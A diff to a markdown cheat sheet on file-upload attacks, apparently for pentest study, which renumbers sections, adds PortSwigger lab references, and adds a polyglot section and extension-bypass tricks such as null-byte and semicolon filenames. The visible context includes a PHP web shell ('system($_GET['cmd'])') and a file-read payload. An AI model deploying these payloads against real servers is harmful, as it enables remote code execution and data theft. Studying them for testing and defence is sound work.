@@ -6,13 +6,13 @@
 2. [Image Upload with Embedded PHP Code](#2-image-upload-with-embedded-php-code)  
 3. [Bypassing Content-Type Validation](#3-bypassing-content-type-validation)
 4. [Uploading Files via Path Traversal Vulnerability](#4-uploading-files-via-path-traversal-vulnerability)  
-5. [Uploading Files Using PUT](#5-uploading-files-using-put)
-7. [PHP Payloads for RCE](#php-payloads-for-rce)  
-   - [Normal Payloads](#normal-payloads)  
-   - [Exploiting Server Configuration](#exploiting-server-configuration)  
+5. [Uploading Files Using PUT](#5-uploading-files-using-put) 
+6. [Exploiting Server Configuration](#6-exploiting-server-configuration)  
      - [Apache Bypass](#apache-bypass)  
      - [IIS Bypass](#iis-bypass)  
-   - [Obfuscating File Extensions](#obfuscating-file-extensions)
+7. [Obfuscating File Extensions](#7-obfuscating-file-extensions)
+8. [File Content Exploit Via Polyglot](#8-File-Content-Exploit-Via-Polyglot)
+9. [PHP Payloads for RCE](#php-payloads-for-rce)
 ---
 ### **1. PHP Web Shell Upload**
 
@@ -116,7 +116,7 @@ Content-Length: 49
 
 <?php echo file_get_contents('/path/to/file'); ?>
 ```
-### **Exploiting Server Configuration**
+### **6. Exploiting Server Configuration**
 
 #### **Apache Bypass**
 ```text
@@ -149,9 +149,11 @@ Content-Type: application/x-httpd-php
 <?php system($_GET['cmd']); ?>
 ```
 
+Reference: [Portswigger Lab Overriding the server configuration](https://portswigger.net/web-security/file-upload#overriding-the-server-configuration)
+
 ---
 
-### **Obfuscating File Extensions**
+### **7. Obfuscating File Extensions**
 ```text
 .php
 .php3
@@ -167,8 +169,20 @@ Content-Type: application/x-httpd-php
 .php%00.jpg
 .php%00.png
 .p.phphp
+.php.
+exploit.asp;.jpg
+exploit.asp%00.jpg
 ```
+
+Reference : [Portswigger](https://portswigger.net/web-security/file-upload#obfuscating-file-extensions)
+
 ---
+
+### **8. File Content Exploit Via Polyglot**
+
+<br>
+
+For more details: [Portswigger](https://portswigger.net/web-security/file-upload#flawed-validation-of-the-file-s-contents)
 
 ## **PHP Payloads for RCE**
 
